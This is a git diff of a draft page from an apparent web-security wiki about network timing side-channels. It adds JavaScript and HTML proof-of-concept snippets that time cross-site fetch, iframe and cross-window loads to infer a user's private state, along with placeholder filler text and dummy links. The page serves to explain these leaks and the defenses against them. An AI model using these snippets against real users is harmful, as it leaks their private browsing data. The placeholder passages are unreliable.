@@ -13,29 +13,73 @@ defenses = [
 menu = "main"
 +++
 
-Timing side-channels have been present on the web since its beginning [^1]. These attacks gained different levels of reliability, gaining a different impact with the begging of the modern web when browsers started shipping high precision timers APIs
+Network Timing side-channels have been present on the web since its beginning [^1]. These attacks gained different levels of impact over time, gaining new attention with the beginning of the modern web when browsers started shipping high precision timers like `performance.now()`.
 
-To obtain timing measurements attackers must use a [clock]({{< ref "../../defenses/opt-in/same-site-cookies.md" >}}), either an implicit or explicit one. For simplicity, this article will address only the `performance.now()` API, an explicit clock present in all modern browsers.
+To obtain timing measurements attackers must use a [clock]({{< ref "clocks.md" >}}), either an implicit or explicit one. For simplicity, this section will address only the `performance.now()` API, an explicit clock present in all modern browsers.
+
+This side-channel allows attackers to infer information from a cross-site request based on how much time it took to request it.
 
 {{< hint info >}}
-Learn more about the different types of clocks in the [Clocks Article]({{< ref "../../defenses/opt-in/same-site-cookies.md" >}}).
+Learn more about the different types of clocks in the [Clocks Article]({{< ref "clocks.md" >}}).
 {{< /hint >}}
-
-## History
-
-
-## Cross-window timing 
-
-
 
 ## Modern Web Timing Attacks
 
+(`performance.now()`)[https://dsadasdas] API [^2]
+
+```javascript
+let before = performance.now()
+await fetch("//mail.com/search?q=foo")
+let request_time = performance.now() - before
+```
+
+{{< hint info >}}
+`performance.now() had its acuracy reduced for allowing [Clocks Article](https://TODO).
+{{< /hint >}}
+
+## Frame Timing
 
 
-# Case Scenarios
+
+```html
+<iframe name=f id=g></iframe>
+<script>
+before = performance.now();
+f.location = '//mail.com/search?q=foo';
+g.onerror = g.onload = ()=>{
+    console.log('time was', performance.now() - before)
+};
+</script>
+```
+
+### Cross-window timing 
+
+```javascript
+let w=0, z=0, v=performance.now();
+onmessage=()=>{
+  try{
+    if(w && w.document.cookie){
+      // still same origin
+    }
+    postMessage('','*');
+  }catch(e){
+    z=performance.now();
+    console.log('time to load was', z - v);
+  }
+};
+postMessage('','*');
+w=open('//www.google.com/robots.txt');
+```
 
 
+## Network Timing
 
+asddsadsadas [^3]
+
+
+## Network Timing 2
+
+dsadsadsadsadsa [^4]
 
 
 ## Defense
@@ -45,9 +89,6 @@ Learn more about the different types of clocks in the [Clocks Article]({{< ref "
 | iframe              |         ✔️         |      ✔️         |  ❌   |          ✔️         |
 | cross-window timing |         ✔️ (if Strict)       |      ✔️         |  ❌   |          ❌         | -->
 
-<!-- {{< hint warning >}}
-The [`portal`](https://web.dev/hands-on-portals/) element is only available on Chromium-based browsers under a preference flag. The corresponding specification is still under active discussion.
-{{< /hint >}} -->
 
 
 [^1]: Exposing Private Information by Timing Web Applications. [link](https://crypto.stanford.edu/~dabo/papers/webtiming.pdf)
